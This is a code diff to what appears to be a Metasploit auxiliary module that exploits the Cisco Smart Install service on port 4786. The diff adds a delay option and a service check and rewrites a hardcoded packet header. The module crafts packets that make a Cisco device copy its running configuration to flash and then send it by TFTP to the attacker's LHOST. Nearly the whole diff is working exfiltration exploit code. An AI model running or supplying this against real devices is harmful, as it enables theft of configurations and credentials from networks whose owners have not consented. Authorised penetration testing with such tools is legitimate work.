@@ -42,7 +42,8 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(4786),
         OptAddressLocal.new('LHOST', [ false, "The IP address of the system running this module" ]),
-        OptInt.new('SLEEP', [ true, "Time to wait for config to come back", 60])
+        OptInt.new('SLEEP', [ true, "Time to wait for config to come back", 60]),
+        OptInt.new('DELAY', [ true, "Time to wait till requesting config to prevent service from becomming unresponsive.", 30])
       ]
     )
   end
@@ -88,16 +89,6 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Incoming file from #{from} - #{name} #{data.length} bytes")
     cisco_ios_config_eater(from, 4786, data)
-    # Save the configuration file if a path is specified
-    #if datastore['OUTPUTDIR']
-    #  name = "#{from}.txt"
-    #  ::FileUtils.mkdir_p(datastore['OUTPUTDIR'])
-    #  path = ::File.join(datastore['OUTPUTDIR'], name)
-    #  ::File.open(path, "wb") do |fd|
-    #    fd.write(data)
-    #  end
-    #  print_status("Saved configuration file to #{path}")
-    #end
   end
 
   def decode_hex(string)
@@ -108,7 +99,7 @@ class MetasploitModule < Msf::Auxiliary
     config_name = "#{Rex::Text.rand_text_alpha(8)}.conf"
     copy_config = "copy system:running-config flash:/#{config_name}"
     transfer_config = "copy flash:/#{config_name} tftp://#{@lhost}/#{config_name}"
-    packet_header = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '800000' + '40800010014' + '0' * 7 + '10' + '0' * 7 + 'fc994737866' + '0' * 7 + '0303f4'
+    packet_header = '00000001000000010000000800000408000100140000000100000000fc99473786600000000303f4'
     packet = (decode_hex(packet_header) + copy_config + decode_hex(('00' * (336 - copy_config.length)))) + (transfer_config + decode_hex(('00' * (336 - transfer_config.length)))) + (decode_hex(('00' * 336)))
     return packet
   end
@@ -142,11 +133,13 @@ class MetasploitModule < Msf::Auxiliary
         when action.name == 'DOWNLOAD'
           start_tftp
           connect
+          return unless smi?
+          print_status("Waiting #{datastore['DELAY']} seconds before requesting config")
+          Rex.sleep(datastore['DELAY']) # reasnoning behind this, on some IOS versions, including my testbed, it becomes unresponsive after SMI
           packet = craft_packet
           print_status("Requesting configuration from device...")
-          vprint_status("Sending packet of #{packet.length} bytes")
-          sock.put(packet)
           print_status("Waiting #{datastore['SLEEP']} seconds for configuration")
+          sock.put(packet)
           Rex.sleep(datastore['SLEEP'])
       end
     rescue Rex::AddressInUse, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, \
